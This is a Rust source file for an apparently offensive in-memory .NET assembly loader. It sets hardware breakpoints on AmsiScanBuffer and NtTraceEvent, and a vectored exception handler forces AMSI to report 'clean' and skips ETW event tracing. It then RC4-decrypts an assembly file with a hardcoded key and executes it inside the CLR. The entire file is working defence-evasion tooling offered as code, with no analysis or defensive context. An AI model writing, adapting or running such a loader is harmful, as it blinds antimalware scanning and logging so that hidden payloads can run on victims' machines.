use std::{env, fs::File, io::Read, mem::zeroed, os::raw::c_void, ptr::null_mut};

use clroxide::clr;
use windows_sys::Win32::{
    Foundation::{EXCEPTION_SINGLE_STEP, S_OK},
    System::{
        Antimalware::{AMSI_RESULT, AMSI_RESULT_CLEAN},
        Diagnostics::Debug::{
            AddVectoredExceptionHandler, CONTEXT, CONTEXT_DEBUG_REGISTERS_AMD64,
            EXCEPTION_CONTINUE_EXECUTION, EXCEPTION_CONTINUE_SEARCH, EXCEPTION_POINTERS,
            GetThreadContext, SetThreadContext,
        },
        LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
        Threading::GetCurrentThread,
    },
};

static mut NT_TRACE_EVENT_ADDR: *mut c_void = null_mut();
static mut AMSI_SCAN_BUFFER_ADDR: *mut c_void = null_mut();

const KEY: &[u8] = &[
    0x70, 0x6c, 0x6d, 0x6f, 0x6b, 0x6e, 0x69, 0x6a, 0x62, 0x75, 0x68, 0x76, 0x79, 0x67, 0x63, 0x74,
    0x66, 0x78, 0x72, 0x64, 0x7a, 0x65, 0x73, 0x77, 0x61, 0x71,
];

struct Rc4 {
    state: [u8; 256],
    i: usize,
    j: usize,
}

impl Rc4 {
    fn new(key: &[u8]) -> Self {
        let mut state = [0u8; 256];
        for (i, b) in state.iter_mut().enumerate() {
            *b = i as u8;
        }

        let mut j = 0;
        for i in 0..256 {
            j = (j + state[i] as usize + key[i % key.len()] as usize) % 256;
            state.swap(i, j);
        }

        Rc4 { state, i: 0, j: 0 }
    }

    fn process(&mut self, data: &mut [u8]) {
        for byte in data.iter_mut() {
            self.i = (self.i + 1) % 256;
            self.j = (self.j + self.state[self.i] as usize) % 256;
            self.state.swap(self.i, self.j);
            let k = self.state[(self.state[self.i] as usize + self.state[self.j] as usize) % 256];
            *byte ^= k;
        }
    }
}

fn set_hwbp(thread_handle: *mut c_void, addr: *mut c_void, reg_index: u32) -> bool {
    unsafe {
        let mut context = zeroed::<CONTEXT>();
        context.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;

        if GetThreadContext(thread_handle, &mut context) == 0 {
            return false;
        }

        match reg_index {
            0 => context.Dr0 = addr as u64,
            1 => context.Dr1 = addr as u64,
            2 => context.Dr2 = addr as u64,
            3 => context.Dr3 = addr as u64,
            _ => return false,
        }

        let local_enable_bit = 1u64 << (reg_index * 2);
        context.Dr7 |= local_enable_bit; // Enable the breakpoint
        context.Dr7 &= !(0x3 << (16 + reg_index * 4)); // Clear the RW bits
        context.Dr7 &= !(0x3 << (18 + reg_index * 4)); // Clear the LEN bits

        if SetThreadContext(thread_handle, &mut context) == 0 {
            return false;
        }
    }

    true
}

fn rm_hwbp(thread_handle: *mut c_void, reg_index: u32) -> bool {
    unsafe {
        let mut context = zeroed::<CONTEXT>();
        context.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;

        if GetThreadContext(thread_handle, &mut context) == 0 {
            return false;
        }

        match reg_index {
            0 => context.Dr0 = 0,
            1 => context.Dr1 = 0,
            2 => context.Dr2 = 0,
            3 => context.Dr3 = 0,
            _ => return false,
        }

        context.Dr7 &= !(1 << (reg_index * 2)); // Disable the breakpoint

        if SetThreadContext(thread_handle, &mut context) == 0 {
            return false;
        }
    }

    true
}

unsafe extern "system" fn exception_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    unsafe {
        if (*(*exception_info).ExceptionRecord).ExceptionCode == EXCEPTION_SINGLE_STEP {
            if (*(*exception_info).ExceptionRecord).ExceptionAddress == NT_TRACE_EVENT_ADDR {
                println!(
                    "[+] VEH Triggered: NtTraceEvent: {:?}",
                    (*(*exception_info).ExceptionRecord).ExceptionAddress
                );

                (*(*exception_info).ContextRecord).Rax = 0;
                (*(*exception_info).ContextRecord).Rip =
                    *((*(*exception_info).ContextRecord).Rsp as *const u64);
                (*(*exception_info).ContextRecord).Rsp += size_of::<*mut c_void>() as u64;

                (*(*exception_info).ContextRecord).EFlags |= 0x10000;

                return EXCEPTION_CONTINUE_EXECUTION;
            } else if (*(*exception_info).ExceptionRecord).ExceptionAddress == AMSI_SCAN_BUFFER_ADDR
            {
                println!(
                    "[+] VEH Triggered: AmsiScanBuffer: {:?}",
                    (*(*exception_info).ExceptionRecord).ExceptionAddress
                );

                /* x64 calling convention at function entry:
                [RSP+0x00] = Return address (8 bytes)
                [RSP+0x08] = Shadow space for RCX (8 bytes)
                [RSP+0x10] = Shadow space for RDX (8 bytes)
                [RSP+0x18] = Shadow space for R8  (8 bytes)
                [RSP+0x20] = Shadow space for R9  (8 bytes)
                [RSP+0x28] = 5th parameter: amsiSession (8 bytes)
                [RSP+0x30] = 6th parameter: AMSI_RESULT* (8 bytes) */

                let amsi_result =
                    *((*(*exception_info).ContextRecord).Rsp as *const *mut AMSI_RESULT).offset(6);

                if !amsi_result.is_null() {
                    *amsi_result = AMSI_RESULT_CLEAN;
                    // *amsi_result = AMSI_RESULT_DETECTED;
                }

                (*(*exception_info).ContextRecord).Rip =
                    *((*(*exception_info).ContextRecord).Rsp as *const u64);
                (*(*exception_info).ContextRecord).Rsp += std::mem::size_of::<*mut c_void>() as u64;
                (*(*exception_info).ContextRecord).Rax = S_OK as u64;

                (*(*exception_info).ContextRecord).EFlags |= 0x10000;

                return EXCEPTION_CONTINUE_EXECUTION;
            }

            return EXCEPTION_CONTINUE_SEARCH;
        }
        return EXCEPTION_CONTINUE_SEARCH;
    }
}

fn bypass() {
    unsafe {
        let h_amsi = LoadLibraryA("amsi.dll\0".as_ptr() as *const u8);

        if h_amsi.is_null() {
            println!("[-] Failed to get handle to amsi.dll");
            return;
        }
        println!("[+] Found amsi.dll at: {:?}", h_amsi);

        let amsi_scan_buffer = GetProcAddress(h_amsi, "AmsiScanBuffer\0".as_ptr() as *const u8)
            .unwrap() as *mut c_void;

        if amsi_scan_buffer.is_null() {
            println!("[-] Failed to get address of AmsiScanBuffer");
            return;
        }

        AMSI_SCAN_BUFFER_ADDR = amsi_scan_buffer;
        println!("[+] Found AmsiScanBuffer at: {:?}", amsi_scan_buffer);

        AddVectoredExceptionHandler(1, Some(exception_handler));
        set_hwbp(GetCurrentThread(), amsi_scan_buffer, 0);

        let h_ntdll = GetModuleHandleA("ntdll.dll\0".as_ptr() as *const u8);

        if h_ntdll.is_null() {
            println!("[-] Failed to get handle to ntdll.dll");
            return;
        }
        println!("[+] Found ntdll.dll at: {:?}", h_ntdll);

        let nt_trace_event =
            GetProcAddress(h_ntdll, "NtTraceEvent\0".as_ptr() as *const u8).unwrap() as *mut c_void;

        if nt_trace_event.is_null() {
            println!("[-] Failed to get address of NtTraceEvent");
            return;
        }

        NT_TRACE_EVENT_ADDR = nt_trace_event;
        println!("[+] Found NtTraceEvent at: {:?}", nt_trace_event);

        AddVectoredExceptionHandler(1, Some(exception_handler));

        set_hwbp(GetCurrentThread(), nt_trace_event, 1);
    }
}

fn main() {
    let args: Vec<String> = env::args().collect();

    if args.len() < 2 {
        println!("[+] Usage: {} assembly.enc <arguments>", args[0]);
        std::process::exit(0);
    }

    let mut assembly_args: Vec<String> = Vec::new();

    if args.len() > 2 {
        assembly_args = args[2..].to_vec();
    }

    let path = args[1].clone();

    println!(
        "[+] Running {} with argument: {}",
        path,
        assembly_args.join(" ")
    );

    let mut file = File::open(path).expect("Failed to open file");
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer).expect("Failed to read file");

    bypass();

    let mut rc4 = Rc4::new(KEY);
    rc4.process(&mut buffer);

    let mut clr = clr::Clr::new(buffer, assembly_args).unwrap();
    unsafe {
        rm_hwbp(GetCurrentThread(), 0);
        rm_hwbp(GetCurrentThread(), 1);
    }
    let result = clr.run().expect("Failed to run assembly");

    print!("{}", result);
}
